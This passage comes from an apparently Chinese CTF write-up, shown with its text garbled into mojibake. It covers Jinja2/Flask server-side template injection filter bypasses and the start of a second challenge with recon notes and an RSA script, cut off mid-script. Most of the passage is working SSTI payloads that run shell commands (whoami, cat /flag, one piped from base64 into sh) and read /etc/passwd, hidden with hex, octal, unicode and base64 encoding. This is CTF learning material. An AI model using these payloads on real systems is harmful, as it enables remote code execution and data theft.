<p>å¯ä»¥åˆ©ç”¨ [ ]ä»£æ›¿ . çš„ä½œç”¨ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{().__class__}} å¯ä»¥æ›¿æ¢ä¸ºï¼š{{()[&#34;__class__&#34;]}}
</span></span><span class="line"><span class="cl">ä¸¾ä¾‹ï¼š
</span></span><span class="line"><span class="cl">{{()[&#39;__class__&#39;][&#39;__base__&#39;][&#39;__subclasses__&#39;]()[433][&#39;__init__&#39;][&#39;__globals__&#39;][&#39;popen&#39;](&#39;whoami&#39;)[&#39;read&#39;]()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.attr()ç»•è¿‡</p>
<p>åŸç”Ÿ JinJa2 çš„ <code>attr()</code> å‡½æ•°â€”â€”è·å–å¯¹è±¡çš„å±æ€§ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{().__class__}} 
</span></span><span class="line"><span class="cl">å¯ä»¥æ›¿æ¢ä¸ºï¼š
</span></span><span class="line"><span class="cl">{{()|attr(&#34;__class__&#34;)}}
</span></span><span class="line"><span class="cl">{{getattr(&#39;&#39;,&#34;__class__&#34;)}}
</span></span><span class="line"><span class="cl">ä¸¾ä¾‹ï¼š
</span></span><span class="line"><span class="cl">{{()|attr(&#39;__class__&#39;)|attr(&#39;__base__&#39;)|attr(&#39;__subclasses__&#39;)()|attr(&#39;__getitem__&#39;)(65)|attr(&#39;__init__&#39;)|attr(&#39;__globals__&#39;)|attr(&#39;__getitem__&#39;)(&#39;__builtins__&#39;)|attr(&#39;__getitem__&#39;)(&#39;eval&#39;)(&#39;__import__(&#34;os&#34;).popen(&#34;whoami&#34;).read()&#39;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="ç»•è¿‡å•åŒå¼•å·">ç»•è¿‡å•åŒå¼•å·</h5>
<p>1.requestç»•è¿‡</p>
<p>flaskä¸­å­˜åœ¨ç€<code>request</code>å†…ç½®å¯¹è±¡å¯ä»¥å¾—åˆ°è¯·æ±‚çš„ä¿¡æ¯ï¼Œ<code>request</code>å¯ä»¥ç”¨5ç§ä¸åŒçš„æ–¹å¼æ¥è¯·æ±‚ä¿¡æ¯ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨å®ƒæ¥ä¼ é€’å‚æ•°ç»•è¿‡ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[213].__init__.__globals__.__builtins__[request.args.arg1](request.args.arg2).read()}}&amp;arg1=open&amp;arg2=/etc/passwd
</span></span><span class="line"><span class="cl">request.argsæ˜¯flaskä¸­çš„ä¸€ä¸ªå±æ€§,ä¸ºè¿”å›è¯·æ±‚çš„å‚æ•°,æŠŠpathå½“ä½œå˜é‡å,å°†åé¢çš„è·¯å¾„ä¼ å€¼è¿›æ¥,è¿›è€Œç»•è¿‡äº†å¼•å·çš„è¿‡æ»¤ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">è‹¥argsè¢«è¿‡æ»¤äº†ï¼Œè¿˜å¯ä»¥ä½¿ç”¨valuesæ¥æ¥å—GETæˆ–è€…POSTå‚æ•°ã€‚
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">å¯æ ¹æ®é¢˜ç›®è¿‡æ»¤çš„ä¸œè¥¿åŠ¨æ€è°ƒæ•´æ–¹æ³•æ¥è¿›è¡Œç»•è¿‡
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.cookies.arg1](request.cookies.arg2).read()}}
</span></span><span class="line"><span class="cl">Cookie:arg1=open;arg2=/etc/passwd
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[40].__init__.__globals__.__builtins__[request.values.arg1](request.values.arg2).read()}}
</span></span><span class="line"><span class="cl">post:arg1=open&amp;arg2=/etc/passwd
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.chrç»•è¿‡</p>
<p>ä½¿ç”¨GETè¯·æ±‚ï¼Œ+å·è®°å¾—urlç¼–ç ï¼Œå¦åˆ™è¢«å½“ä½œç©ºæ ¼å¤„ç†ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{% set chr=().__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.chr%}{{&#39;&#39;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__.__builtins__.__import__(chr(111)%2Bchr(115)).popen(chr(119)%2Bchr(104)%2Bchr(111)%2Bchr(97)%2Bchr(109)%2Bchr(105)).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="ç»•è¿‡å…³é”®å­—">ç»•è¿‡å…³é”®å­—</h5>
<p>1.åè½¬ï¼Œä½¿ç”¨åˆ‡ç‰‡å°†é€†ç½®çš„å…³é”®å­—é¡ºåºè¾“å‡ºï¼Œè¿›è€Œè¾¾åˆ°ç»•è¿‡ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;&#34;[&#34;__cla&#34;&#34;ss__&#34;]
</span></span><span class="line"><span class="cl">&#34;&#34;.__getattribute__(&#34;__cla&#34;&#34;ss__&#34;)
</span></span><span class="line"><span class="cl">åè½¬
</span></span><span class="line"><span class="cl">&#34;&#34;[&#34;__ssalc__&#34;][::-1]
</span></span><span class="line"><span class="cl">&#34;&#34;.__getattribute__(&#34;__ssalc__&#34;[::-1])
</span></span></code></pre></td></tr></table>
</div>
</div><p>2.+å·ï¼Œåˆ©ç”¨&quot;+&ldquo;è¿›è¡Œå­—ç¬¦ä¸²æ‹¼æ¥ï¼Œç»•è¿‡å…³é”®å­—è¿‡æ»¤ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{()[&#39;__cla&#39;+&#39;ss__&#39;].__bases__[0].__subclasses__()[40].__init__.__globals__[&#39;__builtins__&#39;][&#39;ev&#39;+&#39;al&#39;](&#34;__im&#34;+&#34;port__(&#39;o&#39;+&#39;s&#39;).po&#34;&#34;pen(&#39;whoami&#39;).read()&#34;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>3.joinæ‹¼æ¥ï¼Œåˆ©ç”¨join()å‡½æ•°æ¥ç»•è¿‡å…³é”®å­—è¿‡æ»¤</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[40](&#34;fla&#34;.join(&#34;/g&#34;)).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>4.åˆ©ç”¨å¼•å·ç»•è¿‡ï¼Œä»¥ç”¨â€œæˆ–â€çš„å½¢å¼æ¥ç»•è¿‡ï¼š<code>fl&quot;&quot;ag``fl''ag</code>ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{[].__class__.__base__.__subclasses__()[40](&#34;/fl&#34;&#34;ag&#34;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>5.ä½¿ç”¨stråŸç”Ÿå‡½æ•°replaceæ›¿æ¢ï¼Œå°†é¢å¤–çš„å­—ç¬¦æ‹¼æ¥è¿›åŸæœ¬çš„å…³é”®å­—é‡Œé¢ï¼Œç„¶ååˆ©ç”¨replaceå‡½æ•°å°†å…¶æ›¿æ¢ä¸ºç©ºã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{().__getattribute__(&#39;__claAss__&#39;.replace(&#34;A&#34;,&#34;&#34;)).__bases__[0].__subclasses__()[376].__init__.__globals__[&#39;popen&#39;](&#39;whoami&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>6.asciiè½¬æ¢ï¼Œå°†æ¯ä¸€ä¸ªå­—ç¬¦éƒ½è½¬æ¢ä¸ºasciiå€¼åå†æ‹¼æ¥åœ¨ä¸€èµ·ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;{0:c}&#34;.format(97)=&#39;a&#39;
</span></span><span class="line"><span class="cl">&#34;{0:c}{1:c}{2:c}{3:c}{4:c}{5:c}{6:c}{7:c}{8:c}&#34;.format(95,95,99,108,97,115,115,95,95)=&#39;__class__&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p>7.16è¿›åˆ¶ç¼–ç ç»•è¿‡</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;__class__&#34;==&#34;\x5f\x5fclass\x5f\x5f&#34;==&#34;\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f&#34;
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ä¾‹å­ï¼š
</span></span><span class="line"><span class="cl">{{&#39;&#39;.__class__.__mro__[1].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;\x5f\x5f\x69\x6d\x70\x6f\x72\x74\x5f\x5f&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>8.base64ç¼–ç ç»•è¿‡ï¼Œpython2ï¼Œå¯ä»¥åˆ©ç”¨base64è¿›è¡Œç»•è¿‡ï¼Œpython3æ²¡æœ‰decodeæ–¹æ³•ï¼Œæ‰€ä»¥ä¸èƒ½ç”¨è¯¥æ–¹æ³•ç»•è¿‡ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&#34;__class__&#34;==(&#34;X19jbGFzc19f&#34;).decode(&#34;base64&#34;)
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">ä¾‹å­ï¼š
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;X19idWlsdGluc19f&#39;.decode(&#39;base64&#39;)][&#39;ZXZhbA==&#39;.decode(&#39;base64&#39;)](&#39;X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ==&#39;.decode(&#39;base64&#39;))}}
</span></span><span class="line"><span class="cl">ç­‰ä»·äº
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>9.unicodeç¼–ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%print((((lipsum|attr(&#34;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#34;))|attr(&#34;\u0067\u0065\u0074&#34;)(&#34;os&#34;))|attr(&#34;\u0070\u006f\u0070\u0065\u006e&#34;)(&#34;\u0074\u0061\u0063\u0020\u002f\u0066\u002a&#34;))|attr(&#34;\u0072\u0065\u0061\u0064&#34;)())%}
</span></span><span class="line"><span class="cl">lipsum.__globals__[&#39;os&#39;].popen(&#39;tac /f*&#39;).read()
</span></span></code></pre></td></tr></table>
</div>
</div><p>10.Hexç¼–ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f&#39;][&#39;\x65\x76\x61\x6c&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#39;\x6f\x73&#39;].popen(&#39;\x6c\x73\x20\x2f&#39;).read()}}
</span></span><span class="line"><span class="cl">ç­‰ä»·äº
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#39;__import__(&#34;os&#34;).popen(&#34;ls /&#34;).read()&#39;)}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">{{().__class__.__base__.__subclasses__()[77].__init__.__globals__[&#39;os&#39;].popen(&#39;ls /&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>11.8è¿›åˆ¶ç¼–ç </p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{&#39;&#39;[&#39;\137\137\143\154\141\163\163\137\137&#39;].__mro__[1].__subclasses__()[139].__init__.__globals__[&#39;__builtins__&#39;][&#39;\137\137\151\155\160\157\162\164\137\137&#39;](&#39;os&#39;).popen(&#39;whoami&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="å¯¹äºè¿™äº›ç¼–ç è¿›è¡Œç»•è¿‡å°±æ˜¯å°†æ˜¯å­—ç¬¦ä¸²çš„å…³é”®å­—è¿›è¡Œç¼–ç ç„¶åè¿›è¡Œå¯¹åº”è§£ç å³å¯rot13ç­‰å…¶ä»–ç¼–ç ä¹Ÿæ˜¯åŒç†"><em>å¯¹äºè¿™äº›ç¼–ç è¿›è¡Œç»•è¿‡ï¼Œå°±æ˜¯å°†æ˜¯å­—ç¬¦ä¸²çš„å…³é”®å­—è¿›è¡Œç¼–ç ï¼Œç„¶åè¿›è¡Œå¯¹åº”è§£ç å³å¯ï¼Œrot13ç­‰å…¶ä»–ç¼–ç ä¹Ÿæ˜¯åŒç†ã€‚</em></h5>
<p>12.åˆ©ç”¨chrå‡½æ•°ï¼Œæ— æ³•ç›´æ¥ä½¿ç”¨chrå‡½æ•°ï¼Œéœ€è¦é€šè¿‡<code>__builtins__</code>æ‰¾</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{% set chr=url_for.__globals__[&#39;__builtins__&#39;].chr %}
</span></span><span class="line"><span class="cl">{{&#34;&#34;[chr(95)%2bchr(95)%2bchr(99)%2bchr(108)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(95)%2bchr(95)]}}
</span></span></code></pre></td></tr></table>
</div>
</div><p>13.åœ¨jinja2å¯ä»¥ä½¿ç”¨~è¿›è¡Œæ‹¼æ¥</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{%set a=&#39;__cla&#39; %}{%set b=&#39;ss__&#39;%}{{&#34;&#34;[a~b]}}
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="ç»•è¿‡init">ç»•è¿‡init</h5>
<p>å¯ä»¥ç”¨<code>__enter__</code>æˆ–<code>__exit__</code>æ›¿ä»£</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[213].__enter__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;/etc/passwd&#39;).read()}}
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">{{().__class__.__bases__[0].__subclasses__()[213].__exit__.__globals__[&#39;__builtins__&#39;][&#39;open&#39;](&#39;/etc/passwd&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="3payload-2">3.payload</h4>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">payload1ï¼šhexç¼–ç ç»•è¿‡ï¼Œhexç¼–ç äº†cat /f*
</span></span><span class="line"><span class="cl">{{&#34;ge&#34;.__class__.__base__.__subclasses__()[133].__init__.__globals__[&#39;__builtins__&#39;].__import__(&#39;os&#39;).popen(&#39;\x63\x61\x74\x20\x2f\x66\x2a&#39;).read()}} 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">payload2ï¼šåˆ©ç”¨cd..ï¼Œç»•è¿‡/
</span></span><span class="line"><span class="cl">{{&#34;&#34;.__class__.__bases__[0].__subclasses__()[250].__init__.__globals__[&#39;__builtins__&#39;][&#39;eval&#39;](&#34;__import__(&#39;os&#39;).popen(&#39;cd ..&amp;&amp;cat *lag&#39;).read()&#34;)}}
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">payload3ï¼šæœ‰ç‚¹åƒå‚æ•°é€ƒé€¸çš„æ„æ€
</span></span><span class="line"><span class="cl">{{ &#34;&#34;.__class__.__base__ .__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](request.args.get(&#34;ctfshow&#34;)).read()}}ge?ctfshow=cat /flag 
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">payload4ï¼šbase64ç¼–ç ç»•è¿‡
</span></span><span class="line"><span class="cl">{{().__class__.__mro__[-1].__subclasses__()[132].__init__.__globals__[&#39;popen&#39;](&#39;echo &#34;Y2F0IC9mbGFn&#34;|base64 -d|sh&#39;).read()}}
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="æš—ç½‘èŠå¤©å®¤">æš—ç½‘èŠå¤©å®¤</h2>
<h4 id="1åšé¢˜æ€è·¯-3">1.åšé¢˜æ€è·¯</h4>
<p><img src="/images/%e6%9a%97%e7%bd%91%e8%81%8a%e5%a4%a9%e5%ae%a4-1.png"
	
	
	
	loading="lazy"
	
	
></p>
<h5 id="1å…ˆè¿›è¡Œä¸€æ³¢ä¿¡æ¯æœé›†">1.å…ˆè¿›è¡Œä¸€æ³¢ä¿¡æ¯æœé›†</h5>
<ul>
<li>
<p>ç‚¹è¿›åšå®¢é“¾æ¥ï¼Œç›´æ¥å°±æ˜¯å‡ºé¢˜å¸ˆå‚…çš„åšå®¢</p>
</li>
<li>
<p>æç¤ºäº†æœ¬åœ°è®¿é—® 9999 ç«¯å£ï¼Œå¯èƒ½å­˜åœ¨SSRF</p>
</li>
<li>
<p>â€œç‚¹æˆ‘è¿›å…¥å®‡å®™å•†åŸâ€ é“¾æ¥å¯ä»¥è®¿é—®</p>
</li>
<li>
<p>å‘ç°äº†flagæ ¼å¼ctfshow{}ï¼Œflagå¯èƒ½å­˜åœ¨äºèŠå¤©å®¤çš„æŸäº›å®£ä¼ ä¸­</p>
</li>
<li>
<p>ç‚¹äº†ä¸Šé¢çš„é€‰é¡¹ï¼Œå‘ç°åªæœ‰æ’ä»¶å¯ä»¥ç”¨</p>
</li>
</ul>
<h5 id="2ç‚¹æˆ‘è¿›å…¥å®‡å®™å•†åŸ-é“¾æ¥å›æ˜¾äº†è‡ªå·±çš„ip">2.â€œç‚¹æˆ‘è¿›å…¥å®‡å®™å•†åŸâ€ é“¾æ¥ï¼Œå›æ˜¾äº†è‡ªå·±çš„IP</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">é¡µé¢å†…å®¹ï¼š
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">æŠ±æ­‰ï¼Œæœ¬ç½‘ç«™å› è¢«é»‘å®¢æ”»å‡»æ­£åœ¨æŠ¢ä¿®ä¸­...
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Your IPï¼š2.56.12.89
</span></span><span class="line"><span class="cl">æ‚¨çš„è®¿é—®å·²è®°å…¥æ—¥å¿—ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="3ç‚¹å¼€æ’ä»¶å‘ç°äº†æ–°çš„ä¸œè¥¿">3.ç‚¹å¼€æ’ä»¶ï¼Œå‘ç°äº†æ–°çš„ä¸œè¥¿</h5>
<p><img src="/images/%e6%9a%97%e7%bd%91%e8%81%8a%e5%a4%a9%e5%ae%a4-2.png"
	
	
	
	loading="lazy"
	
	
></p>
<p><img src="/images/%e6%9a%97%e7%bd%91%e8%81%8a%e5%a4%a9%e5%ae%a4-3.png"
	
	
	
	loading="lazy"
	
	
></p>
<p><img src="/images/%e6%9a%97%e7%bd%91%e8%81%8a%e5%a4%a9%e5%ae%a4-4.png"
	
	
	
	loading="lazy"
	
	
></p>
<p>ç»§ç»­ä¸€æ³¢ä¿¡æ¯æœé›†</p>
<ul>
<li>
<p>æœ€ä¸Šé¢å‘ç°äº†ç§é’¥ï¼ŒåŸå§‹æ•°æ®ï¼ŒåŠ å¯†æ•°æ®</p>
</li>
<li>
<p>æœ‰ä¸€ä¸ªä¸‰å±‚ä»£ç†çš„åŸºæœ¬åŸç†å›¾</p>
</li>
<li>
<p>è¿˜æœ‰ä¸€ä¸ªåŠ å¯†è„šæœ¬</p>
</li>
<li>
<p>é€šè¿‡è„šæœ¬è§‚å¯Ÿåˆ°äº†é•¿åº¦128ä¸€åŠ å¯†ï¼Œå¹¶ä¸”æ˜¯utf-8ç¼–ç åŠ å¯†</p>
</li>
<li>
<p>çœ‹åˆ°ä¹‹å‰çš„å®£ä¼ è¯­ï¼Œå¤åˆ¶ï¼Œæ”¾åœ¨æ–‡æœ¬æ–‡ä»¶ï¼Œå‘ç°é•¿åº¦ä¸º134&gt;128</p>
</li>
<li>
<p>å¤åˆ¶åŸå§‹æ•°æ®ï¼Œåˆ°æ–‡æœ¬æ–‡ä»¶ï¼Œå‘ç°é•¿åº¦ä¸º18944</p>
</li>
<li>
<p>åˆ©ç”¨åŠ å¯†è„šæœ¬ï¼Œå…ˆè‡ªå·±è·‘ä¸€ä¸‹</p>
</li>
<li>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.PublicKey</span> <span class="kn">import</span> <span class="n">RSA</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">Crypto.Cipher</span> <span class="kn">import</span> <span class="n">PKCS1_v1_5</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># åŠ å¯†</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">,</span> <span class="n">public_key</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">cipher</span> <span class="o">=</span> <span class="n">PKCS1_v1_5</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">RSA</span><span class="o">.</span><span class="n">importKey</span><span class="p">(</span><span class="n">public_key</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="n">ciphertext</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">plaintext</span><span class="p">),</span> <span class="mi">128</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="n">ciphertext</span> <span class="o">+=</span> <span class="n">cipher</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">plaintext</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span> <span class="o">+</span> <span class="mi">128</span><span class="p">]</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">))</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">))</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">ciphertext</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">key</span> <span class="o">=</span> <span class="n">RSA</span><span class="o">.</span><span class="n">generate</span><span class="p">(</span><span class="mi">2048</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">public_key1</span> <span class="o">=</span> <span class="n">key</span><span class="o">.</span><span class="n">publickey</span><span class="p">()</span><span class="o">.</span><span class="n">export_key</span><span class="p">()</span>
